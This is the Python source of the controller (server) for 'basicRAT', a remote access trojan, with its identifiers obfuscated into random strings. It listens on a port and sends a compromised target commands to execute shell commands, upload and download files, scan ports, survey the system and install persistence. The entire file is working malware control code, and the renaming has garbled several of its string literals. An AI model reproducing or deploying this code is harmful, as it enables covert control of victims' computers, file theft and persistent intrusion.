#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import ofRSbfGSJUJdJOMAHnOdMFDQhCuQDoiv,TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM,WgMnRzLdkIWLGgzowFdvUafwiPBCbvOk
    from core.filesock import FEDRkrcFQWVmxhAcLZqwmJisXuseuPOa, thflmVfaWGOyjCvyeYkEruExtxkCUNyb
except ImportError as rYtPUkZrJGeeHtvXvzJfaOcxxksrGrrc:
    print rYtPUkZrJGeeHtvXvzJfaOcxxksrGrrc
    sys.exit(0)
SFZgIHtInVrCYZkUQVhiUiWOmlGHfpxW = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
RWBSCIiuCIasgCiwWKVBYEYSgmFoPKaC = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
zhrwkhKcNAEzmQiWLdnSindPiTaIMwjA = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def IeSXQtLYaPvEzHocPOYlJcdLgnkQyFLn():
    opyckOqyMpuAOLTphRnDGRhLZXLbsGFR = argparse.ArgumentParser(description='basicRAT server')
    opyckOqyMpuAOLTphRnDGRhLZXLbsGFR.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return opyckOqyMpuAOLTphRnDGRhLZXLbsGFR
def bUNfVvBJLHRybjIpSRfNoeFmJIFXEPtE():
    opyckOqyMpuAOLTphRnDGRhLZXLbsGFR  = IeSXQtLYaPvEzHocPOYlJcdLgnkQyFLn()
    qlgeinANkMCcqNbskhCUJQopuialfgLA    = vars(opyckOqyMpuAOLTphRnDGRhLZXLbsGFR.parse_args())
    hotpvyCtUocjiRlkAJaeeKckVocfFJwU    = qlgeinANkMCcqNbskhCUJQopuialfgLA['port']
    VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.bind(('0.0.0.0', hotpvyCtUocjiRlkAJaeeKckVocfFJwU))
    except socket.error:
        print 'Error: Unable to start NALWfnGzUeuWyziYDnvFfiMmryRuvziU, hotpvyCtUocjiRlkAJaeeKckVocfFJwU {} in use?'.format(hotpvyCtUocjiRlkAJaeeKckVocfFJwU)
        sys.exit(1)
    for DWsazxpiktHbaYRcWvYOUhGJaHUpLWdy in RWBSCIiuCIasgCiwWKVBYEYSgmFoPKaC.split('\n'):
        time.sleep(0.05)
        print DWsazxpiktHbaYRcWvYOUhGJaHUpLWdy
    print 'basicRAT NALWfnGzUeuWyziYDnvFfiMmryRuvziU listening on hotpvyCtUocjiRlkAJaeeKckVocfFJwU {}...'.format(hotpvyCtUocjiRlkAJaeeKckVocfFJwU)
    VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.listen(10)
    zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA, mQAUcDqiPRMSvVCAaGmBLBFTAVKndNUS = VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.accept()
    hHQNAodaODzLNcayZGrbgZuWinklxUZy = WgMnRzLdkIWLGgzowFdvUafwiPBCbvOk(zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA, NALWfnGzUeuWyziYDnvFfiMmryRuvziU=True)
    while True:
        ztxeMmALXgRbqznYZpLMTjSgdNPvfLaU = raw_input('\n[{}] basicRAT> '.format(mQAUcDqiPRMSvVCAaGmBLBFTAVKndNUS[0])).rstrip()
        if not ztxeMmALXgRbqznYZpLMTjSgdNPvfLaU:
            continue
        pKfWachXPLSMXEfhHPURDawLBArxrMxG, _, action = ztxeMmALXgRbqznYZpLMTjSgdNPvfLaU.partition(' ')
        if pKfWachXPLSMXEfhHPURDawLBArxrMxG not in zhrwkhKcNAEzmQiWLdnSindPiTaIMwjA:
            print 'Invalid command, type "help" to see XmmaRyZddRfxXfJdsxeeLGoZRHuHBzMw list of commands.'
            continue
        if pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'help':
            print SFZgIHtInVrCYZkUQVhiUiWOmlGHfpxW
            continue
        zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA.send(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(ztxeMmALXgRbqznYZpLMTjSgdNPvfLaU, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
        if pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'quit':
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.close()
            sys.exit(0)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'run':
            KPpxfqrUdOUBUWQklKipLhgsxEgngjuU = zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA.recv(4096)
            print ofRSbfGSJUJdJOMAHnOdMFDQhCuQDoiv(KPpxfqrUdOUBUWQklKipLhgsxEgngjuU, hHQNAodaODzLNcayZGrbgZuWinklxUZy).rstrip()
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'download':
            for wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj in action.split():
                wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj = wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj.strip()
                FEDRkrcFQWVmxhAcLZqwmJisXuseuPOa(zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA, wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj, hHQNAodaODzLNcayZGrbgZuWinklxUZy)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'upload':
            for wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj in action.split():
                wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj = wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj.strip()
                thflmVfaWGOyjCvyeYkEruExtxkCUNyb(zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA, wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj, hHQNAodaODzLNcayZGrbgZuWinklxUZy)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'rekey':
            hHQNAodaODzLNcayZGrbgZuWinklxUZy = WgMnRzLdkIWLGgzowFdvUafwiPBCbvOk(zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA, NALWfnGzUeuWyziYDnvFfiMmryRuvziU=True)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(pKfWachXPLSMXEfhHPURDawLBArxrMxG)
            KPpxfqrUdOUBUWQklKipLhgsxEgngjuU = zdntRnUmyadsYtTHdbBmBpcxQqaUfyAA.recv(1024)
            print ofRSbfGSJUJdJOMAHnOdMFDQhCuQDoiv(KPpxfqrUdOUBUWQklKipLhgsxEgngjuU, hHQNAodaODzLNcayZGrbgZuWinklxUZy)
if __name__ == '__main__':
    bUNfVvBJLHRybjIpSRfNoeFmJIFXEPtE()
